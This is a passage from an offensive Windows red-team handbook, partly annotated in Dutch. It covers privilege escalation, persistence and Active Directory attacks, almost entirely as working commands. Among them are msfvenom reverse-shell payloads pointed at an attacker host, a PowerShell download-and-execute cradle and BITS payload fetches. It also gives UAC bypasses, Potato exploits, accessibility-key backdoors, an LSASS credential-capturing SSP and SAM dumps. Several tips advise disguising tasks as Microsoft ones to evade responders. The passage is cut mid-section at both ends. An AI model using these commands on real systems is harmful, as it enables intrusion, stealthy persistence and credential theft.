â”‚  â˜ SAM backup files                   â˜ ACL misconfigurations               â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 4.2 Quick Enumeration Tools

```powershell
# === AUTOMATED ENUMERATION ===

# PowerUp (PowerSploit)
Import-Module PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII privesc.txt

# WinPEAS
.\winPEASx64.exe

# Seatbelt (GhostPack)
Seatbelt.exe -group=all

# Watson (Missing patches)
Watson.exe

# SharpUp
SharpUp.exe

# BeRoot
beRoot.exe

# PrivescCheck (PowerShell)
Import-Module PrivescCheck.ps1
Invoke-PrivescCheck
```

---

## 4.3 Unquoted Service Paths

```powershell
# === UNQUOTED SERVICE PATHS ===
# If path has spaces and is unquoted, Windows searches each segment

# Example vulnerable path:
# C:\Program Files\My Program\My Service\service.exe
# Windows tries:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My Program\My.exe
# etc.

# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike '*"*' -and $_.PathName -like '* *' } | Select-Object Name,PathName,StartMode

# PowerUp
Get-ServiceUnquoted

# Exploit:
# 1. Find writable directory in path
# 2. Place malicious executable with partial name
# 3. Restart service (or wait for reboot)

# Check write permissions
icacls "C:\Program Files\Vulnerable App\"

# Create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o My.exe

# Copy to writable path
copy My.exe "C:\Program Files\Vulnerable App\My.exe"

# Restart service
sc stop "VulnerableService"
sc start "VulnerableService"
# Or: Reboot machine
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Unquoted paths zijn een klassieke privesc.
> Vaak over het hoofd gezien door sysadmins.
> Check ook x86 paths: C:\Program Files (x86)\

---

## 4.4 Weak Service Permissions

```powershell
# === SERVICE PERMISSION ABUSE ===
# If you can modify service binary or config = SYSTEM

# Check service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "%username%" *

# PowerUp
Get-ModifiableService

# What to look for:
# SERVICE_CHANGE_CONFIG - Can change executable path
# SERVICE_ALL_ACCESS - Full control
# WRITE_DAC - Can change permissions
# WRITE_OWNER - Can take ownership

# Exploit SERVICE_CHANGE_CONFIG
sc config VulnService binPath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService

# Or add user to admins
sc config VulnService binPath= "net localgroup administrators attacker /add"
sc stop VulnService
sc start VulnService
```

---

## 4.5 DLL Hijacking

```powershell
# === DLL HIJACKING ===
# Applications search for DLLs in specific order
# If we can place our DLL earlier in search path = code execution

# DLL Search Order (SafeDllSearchMode enabled):
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory (C:\Windows\System)
# 4. Windows directory (C:\Windows)
# 5. Current directory
# 6. PATH directories

# Find missing DLLs
# Use Process Monitor (procmon) with filters:
# - Result = NAME NOT FOUND
# - Path ends with .dll

# Common hijackable DLLs:
# - wlbsctrl.dll (IKEEXT service)
# - wbemcomn.dll (WMI)
# - VERSION.dll (many apps)
# - CRYPTBASE.dll (many apps)

# Check if service DLL is hijackable
sc qc TargetService
# Check: BINARY_PATH_NAME for DLL

# PowerUp
Find-PathDLLHijack
Find-ProcessDLLHijack

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o hijack.dll

# Place in writable directory in DLL search path
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **DLL Hijacking tips:**
> - Check %PATH% voor writable directories
> - Check applicatie directories
> - Veel 3rd party software is kwetsbaar
> - Use: icacls to check write permissions

---

## 4.6 Scheduled Tasks Abuse

```powershell
# === SCHEDULED TASK ABUSE ===

# List all scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | 
    ForEach-Object { Get-ScheduledTaskInfo $_ }

# Find tasks with writable executables
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = $task.Actions
    foreach ($action in $actions) {
        if ($action.Execute) {
            $path = $action.Execute
            if (Test-Path $path) {
                $acl = Get-Acl $path
                if ($acl.AccessToString -match "Users.*Write|Everyone.*Write|Authenticated Users.*Write") {
                    [PSCustomObject]@{
                        TaskName = $task.TaskName
                        Execute = $path
                        Permissions = "WRITABLE"
                    }
                }
            }
        }
    }
}

# Check specific task
$task = Get-ScheduledTask -TaskName "TaskName"
$task.Actions

# If executable is writable:
# 1. Backup original
# 2. Replace with payload
# 3. Wait for execution

# If task runs as SYSTEM and executable is writable:
copy malicious.exe "C:\Path\To\TaskBinary.exe"
```

---

## 4.7 AlwaysInstallElevated

```powershell
# === ALWAYSINSTALLELEVATED ===
# If enabled: ANY .msi runs as SYSTEM

# Check if vulnerable
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must be 1 for vulnerability

# PowerUp
Get-RegistryAlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i shell.msi
```

---

## 4.8 Token Privileges Abuse

```powershell
# === SEIMPERSONATEPRIVILEGE ===
# Common for: IIS, SQL Server, service accounts

# Check privileges
whoami /priv

# If SeImpersonatePrivilege is present:
# Use Potato attacks

# PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -i -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# GodPotato (Universal, works on latest Windows)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "net user attacker Password123! /add && net localgroup administrators attacker /add"

# JuicyPotato (Windows Server 2016, older)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user attacker Password123! /add" -t *

# RoguePotato (Windows Server 2019+)
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999

# SweetPotato (Combination)
SweetPotato.exe -p beacon.exe

# === SEBACKUPPRIVILEGE ===
# Can read any file including SAM/NTDS

# Backup SAM and SYSTEM
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak

# Or use diskshadow for NTDS.dit
diskshadow.exe /s script.txt

# === SERESTOREPRIVILEGE ===
# Can write any file - replace system binaries

# === SETAKEOWNERSHIPPRIVILEGE ===
# Can take ownership of any file/object

takeown /f "C:\Windows\System32\config\SAM"
icacls "C:\Windows\System32\config\SAM" /grant %username%:F

# === SELOADDRIVERPRIVILEGE ===
# Can load kernel drivers = kernel code execution

# Load vulnerable driver
# Exploit kernel vulnerability
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Potato attacks evolution:**
> - **JuicyPotato** â†’ Windows Server 2016 and earlier
> - **RoguePotato** â†’ Windows Server 2019
> - **PrintSpoofer** â†’ Windows 10/Server 2016-2019
> - **GodPotato** â†’ Universal, works everywhere
>
> Always try GodPotato first on modern systems.

---

## 4.9 UAC Bypass Techniques

```powershell
# === UAC BYPASS ===
# Bypass User Account Control for elevation

# Check UAC status
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# ConsentPromptBehaviorAdmin values:
# 0 = Elevate without prompting
# 1 = Prompt for credentials on secure desktop
# 2 = Prompt for consent on secure desktop
# 3 = Prompt for credentials
# 4 = Prompt for consent
# 5 = Prompt for consent for non-Windows binaries (DEFAULT)

# === BYPASS METHODS ===

# Method 1: Fodhelper (Windows 10)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# Cleanup
reg delete HKCU\Software\Classes\ms-settings\shell /f

# Method 2: ComputerDefaults (Windows 10)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
ComputerDefaults.exe

# Method 3: sdclt.exe (Windows 10)
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /t REG_SZ /f
sdclt.exe

# Method 4: UACME (Collection of bypasses)
# https://github.com/hfiref0x/UACME
akagi64.exe 61 cmd.exe

# Method 5: DiskCleanup (fileless)
schtasks /create /tn "Bypass" /tr "cmd.exe /c start cmd.exe" /sc once /st 00:00 /RL HIGHEST
schtasks /run /tn "Bypass"
schtasks /delete /tn "Bypass" /f
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **UAC bypass selectie:**
> - Windows 10 1803+: fodhelper of ComputerDefaults
> - Windows 11: Steeds moeilijker, test UACME
> - Server editions: UAC vaak disabled
>
> **Check ALTIJD eerst of UAC aan staat.**

---

## 4.10 Kernel Exploits

```powershell
# === KERNEL EXPLOITS ===
# Missing patches = direct SYSTEM

# Check OS and patch level
systeminfo
wmic qfe list

# Watson (auto-detect exploits)
Watson.exe

# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2024-01-01.xlsx --systeminfo sysinfo.txt

# Common exploits:

# MS16-032 - Secondary Logon (Win 7-10, Server 2008-2016)
# MS16-098 - afd.sys (Win 7-10, Server 2008R2)
# MS17-010 - EternalBlue (Win 7, Server 2008R2)
# CVE-2020-0796 - SMBGhost (Win 10 1903/1909)
# CVE-2021-1732 - Win32k (Win 10, Server 2019)
# CVE-2021-34527 - PrintNightmare (Universal)
# CVE-2022-21999 - SpoolFool (Server 2019/2022)
# CVE-2023-28252 - CLFS (Win 10/11, Server 2019/2022)

# PrintNightmare exploitation
# Remote:
rpcdump.py @10.10.10.10 | grep MS-RPRN
python printnightmare.py DOMAIN/user:pass@TARGET -dll \\ATTACKER\share\evil.dll

# Local:
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare -NewUser "attacker" -NewPassword "P@ssw0rd"
```

---

# 5. PERSISTENCE â€” 30+ TECHNIQUES

## 5.1 Persistence Categorization

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    PERSISTENCE TECHNIQUES                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  USER-LEVEL (No admin required)       ADMIN-LEVEL (Requires elevation)      â”‚
â”‚  â”œâ”€â”€ Registry Run Keys                â”œâ”€â”€ Services                          â”‚
â”‚  â”œâ”€â”€ Startup Folder                   â”œâ”€â”€ Scheduled Tasks (SYSTEM)          â”‚
â”‚  â”œâ”€â”€ Scheduled Tasks (user)           â”œâ”€â”€ WMI Event Subscriptions           â”‚
â”‚  â”œâ”€â”€ Office Macros                    â”œâ”€â”€ DLL Hijacking                     â”‚
â”‚  â”œâ”€â”€ Browser Extensions               â”œâ”€â”€ COM Hijacking                     â”‚
â”‚  â””â”€â”€ Logon Scripts                    â”œâ”€â”€ Image File Execution Options      â”‚
â”‚                                       â”œâ”€â”€ AppInit_DLLs                      â”‚
â”‚  STEALTH TECHNIQUES                   â”œâ”€â”€ LSA Extensions                    â”‚
â”‚  â”œâ”€â”€ WMI Events                       â”œâ”€â”€ Security Support Provider         â”‚
â”‚  â”œâ”€â”€ Time Providers                   â”œâ”€â”€ BootExecute                       â”‚
â”‚  â”œâ”€â”€ Print Monitors                   â”œâ”€â”€ Netsh Helper DLLs                 â”‚
â”‚  â””â”€â”€ Screensaver                      â””â”€â”€ Group Policy                      â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 5.2 Registry Run Keys

```powershell
# === REGISTRY RUN KEYS ===
# Execute on user login

# User-level (no admin)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# Machine-level (admin required)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\System32\payload.exe" /f

# RunOnce (executes once, then deleted)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Updater /t REG_SZ /d "C:\payload.exe" /f

# Alternative locations:
# HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
# HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
# HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
# HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

# 32-bit on 64-bit Windows
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe" /f

# Check existing entries
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Run keys zijn het MEEST GEDETECTEERD.
> Gebruik alleen als je niets beters hebt.
> Combineer met OPSEC: rename binary, hide location.

---

## 5.3 Startup Folder

```powershell
# === STARTUP FOLDER ===

# User startup folder
$startupPath = [Environment]::GetFolderPath('Startup')
Copy-Item payload.exe "$startupPath\updater.exe"

# All users startup folder (admin required)
Copy-Item payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"

# Create shortcut instead of executable (stealthier)
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$startupPath\Updater.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -File C:\Users\Public\updater.ps1"
$Shortcut.Save()
```

---

## 5.4 Scheduled Tasks

```powershell
# === SCHEDULED TASKS ===

# Create task running as current user
schtasks /create /tn "Windows Update" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru %username%

# Create task running as SYSTEM (admin required)
schtasks /create /tn "Windows Update" /tr "C:\Windows\System32\payload.exe" /sc onstart /ru SYSTEM

# Daily at specific time
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\maint.exe" /sc daily /st 09:00 /ru SYSTEM

# On idle
schtasks /create /tn "Cleanup" /tr "C:\Windows\Temp\clean.exe" /sc onidle /i 5

# Hidden task (PowerShell)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Users\Public\update.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "Microsoft\Windows\Maintenance" -Action $action -Trigger $trigger -Settings $settings -User "NT AUTHORITY\SYSTEM"

# List tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# Delete task
schtasks /delete /tn "TaskName" /f
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Stealth tips:**
> - Use Microsoft-looking task names
> - Place in legitimate task folders: Microsoft\Windows\
> - Set to run when idle or on specific schedule
> - Avoid obvious triggers like "at startup"

---

## 5.5 Windows Services

```powershell
# === SERVICE PERSISTENCE ===
# Requires admin

# Create service
sc create "Windows Update Service" binPath= "C:\Windows\System32\payload.exe" start= auto
sc start "Windows Update Service"

# Or with description
sc create UpdateSvc binPath= "C:\Windows\System32\svc.exe" start= auto DisplayName= "Windows Update Service" obj= LocalSystem
sc description UpdateSvc "Provides software updates for Windows"

# Service with svchost (more stealth)
# 1. Create DLL that exports ServiceMain
# 2. Add to svchost group
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "netsvcs" /t REG_MULTI_SZ /d "existing\0yourservice" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\YourService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\System32\payload.dll" /f

# Delete service
sc delete "ServiceName"

# List services
sc query state= all
Get-Service
```

---

## 5.6 WMI Event Subscriptions

```powershell
# === WMI EVENT SUBSCRIPTIONS ===
# Highly persistent, survives reboots
# Very stealthy - rarely checked

# Components needed:
# 1. Event Filter (trigger condition)
# 2. Event Consumer (action to take)
# 3. Binding (links filter to consumer)

# Example: Execute on user logon
$filterName = "ProcessStartTrigger"
$consumerName = "ProcessStartConsumer"
$ns = "root\subscription"

# Create Filter - triggers on process start
$Filter = Set-WMIInstance -Namespace $ns -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# Create Consumer - CommandLine execution
$Consumer = Set-WMIInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -File C:\Users\Public\update.ps1"
}

# Create Binding
Set-WMIInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# Alternative: Use mofcomp for persistence script
# Compile .mof file
mofcomp persistence.mof

# Check existing subscriptions
Get-WMIObject -Namespace "root\subscription" -Class __EventFilter
Get-WMIObject -Namespace "root\subscription" -Class __EventConsumer
Get-WMIObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# Remove subscription
Get-WMIObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='ProcessStartTrigger'" | Remove-WMIObject
Get-WMIObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='ProcessStartConsumer'" | Remove-WMIObject
Get-WMIObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*ProcessStartTrigger*"} | Remove-WMIObject
```

> **ðŸ“˜ SENIOR INSIGHT:**
> WMI subscriptions zijn UITSTEKEND voor persistence:
> - Overleven reboots
> - Niet zichtbaar in normale admin tools
> - Moeilijk te detecteren
> - Vaak vergeten door incident responders
>
> **Detection:** Sysmon Event ID 19, 20, 21

---

## 5.7 COM Object Hijacking

```powershell
# === COM HIJACKING ===
# Replace legitimate COM objects with malicious DLLs

# Find hijackable COM objects (missing DLLs)
# Use Process Monitor with filter: Result = NAME NOT FOUND, Path ends with .dll

# Common targets:
# HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32 (user level, takes precedence)
# HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32 (system level)

# Example: Hijack MMC snap-in
# CLSID for frequently used COM objects:
# {0A29FF9E-7F9C-4437-8B11-F424491E3931} - Task Scheduler

# Create hijack
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f

# Script to find exploitable CLSIDs
$vuln = @()
Get-ChildItem -Path "HKLM:\SOFTWARE\Classes\CLSID" | ForEach-Object {
    $server = Get-ItemProperty -Path "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue
    if ($server -and $server.'(Default)' -and !(Test-Path $server.'(Default)')) {
        $vuln += [PSCustomObject]@{
            CLSID = $_.PSChildName
            DLL = $server.'(Default)'
        }
    }
}
$vuln
```

---

## 5.8 Image File Execution Options (IFEO)

```powershell
# === IFEO DEBUGGER PERSISTENCE ===
# Hijack legitimate binary execution

# When specified binary runs, debugger runs instead
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\payload.exe" /f

# Global Flags (silent process exit monitoring)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\payload.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f

# Check existing IFEO entries
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

> **ðŸ“˜ SENIOR INSIGHT:**
> IFEO is goed voor:
> - Accessibility feature abuse (sethc.exe, utilman.exe)
> - Hijacking common tools
> - Stealth wanneer gecombineerd met legitieme processen

---

## 5.9 AppInit_DLLs

```powershell
# === APPINIT_DLLS ===
# DLL loaded into every process that loads user32.dll
# Requires admin

# Enable and set DLL
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\System32\payload.dll" /f

# For 32-bit on 64-bit
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\SysWOW64\payload32.dll" /f

# Disable
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f
```

> **ðŸ“˜ SENIOR INSIGHT:**
> AppInit_DLLs is LAWAAIG - je DLL laadt in ALLES.
> Kan stabiliteit beÃ¯nvloeden.
> Disabled by default in Windows 8+ met Secure Boot.

---

## 5.10 Accessibility Features

```powershell
# === ACCESSIBILITY FEATURE ABUSE ===
# Replace accessibility binaries with cmd.exe
# Trigger at login screen without auth

# Sticky Keys (5x Shift at login screen)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y

# Utility Manager (Win+U at login screen)
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /y

# Narrator (Win+Enter at login screen)
takeown /f C:\Windows\System32\Narrator.exe
icacls C:\Windows\System32\Narrator.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe /y

# Alternative: IFEO instead of replacing
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# Trigger: Press Shift 5 times at login screen
# Opens cmd.exe as SYSTEM
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Accessibility backdoors:
> - Klassieke red team techniek
> - Werkt op login screen (geen auth nodig)
> - IFEO versie is stealthier
> - Makkelijk te detecteren, maar vaak vergeten

---

## 5.11 BITS Jobs

```powershell
# === BITS PERSISTENCE ===
# Background Intelligent Transfer Service
# Persistent download/upload jobs

# Create persistent BITS job
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://attacker/payload.exe C:\Users\Public\update.exe
bitsadmin /SetNotifyCmdLine backdoor "C:\Users\Public\update.exe" NULL
bitsadmin /SetMinRetryDelay backdoor 300
bitsadmin /resume backdoor

# Alternative: PowerShell
Start-BitsTransfer -Source "http://attacker/payload.exe" -Destination "C:\Users\Public\update.exe" -Asynchronous

# BITS jobs persist across reboots
# List BITS jobs
bitsadmin /list /allusers /verbose
Get-BitsTransfer -AllUsers

# Remove
bitsadmin /cancel backdoor
```

---

## 5.12 Netsh Helper DLL

```powershell
# === NETSH HELPER DLL ===
# Load DLL when netsh.exe runs

# Register helper DLL
netsh add helper C:\Windows\System32\payload.dll

# DLL loads whenever netsh is used
# Trigger manually or via scheduled task

# Check registered helpers
netsh show helper

# Remove
netsh delete helper C:\Windows\System32\payload.dll
```

---

## 5.13 Security Support Provider (SSP)

```powershell
# === SSP PERSISTENCE ===
# DLL loaded by LSASS at startup
# Can intercept credentials!

# Add SSP (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# Copy mimilib.dll to System32
copy mimilib.dll C:\Windows\System32\

# Reboot required
# After reboot, all credentials logged to C:\Windows\System32\kiwissp.log

# Alternative: AddSecurityPackage API (no reboot)
# Use mimikatz: misc::memssp
```

> **ðŸ“˜ SENIOR INSIGHT:**
> SSP persistence is ZEER STEALTHY:
> - Runs in LSASS (trusted process)
> - Can capture all authentication
> - Moeilijk te detecteren
> - Maar: LSASS modificatie kan crash veroorzaken

---

## 5.14 Print Monitor

```powershell
# === PRINT MONITOR DLL ===
# DLL loaded by spoolsv.exe (SYSTEM)

# Register print monitor
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Evilmonitor" /v Driver /t REG_SZ /d "payload.dll" /f

# Copy DLL
copy payload.dll C:\Windows\System32\

# Restart spooler
net stop spooler
net start spooler

# Check monitors
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors"
```

---

## 5.15 Time Provider

```powershell
# === TIME PROVIDER DLL ===
# DLL loaded by W32Time service

# Register time provider
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v DllName /t REG_SZ /d "C:\Windows\System32\payload.dll" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v Enabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\EvilProvider" /v InputProvider /t REG_DWORD /d 1 /f

# Restart time service
net stop w32time
net start w32time
```

---

## 5.16 Screensaver Persistence

```powershell
# === SCREENSAVER PERSISTENCE ===
# Executes when screensaver activates

# Set malicious screensaver
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\Public\payload.exe" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f

# Check current screensaver
reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE
```

---
 ABUSE ===
# Abuse misconfigured Access Control Lists

# Dangerous rights:
# GenericAll - Full control
# GenericWrite - Modify object
# WriteOwner - Take ownership
# WriteDACL - Modify permissions
# ForceChangePassword - Reset password
# AddMembers - Add to group

# PowerView: Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner" }

# If you have GenericAll on a user:
# Reset their password
net user targetuser NewPassword123! /domain

# If you have WriteDACL:
# Give yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attackeruser -Rights All

# If you have GenericAll on a group:
# Add yourself to the group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# If you have GenericWrite on a user:
# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
# Then Kerberoast

# AddKeyCredentialLink (Shadow Credentials)
# If you have GenericAll/GenericWrite on user/computer
Whisker.exe add /target:targetuser /domain:DOMAIN /dc:DC.DOMAIN.LOCAL
# Creates certificate for authentication
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:pass /ptt
```

---

## 8.3 Kerberos Delegation Attacks

```powershell
# === UNCONSTRAINED DELEGATION ===
# Computer/user trusted to delegate to ANY service

# Find unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname
Get-DomainUser -TrustedToAuth | Select-Object name

# Attack: Make DC connect to compromised server
# Using Rubeus monitor + SpoolSample/PetitPotam

# Start Rubeus monitor on unconstrained host
Rubeus.exe monitor /interval:5 /filteruser:DC$

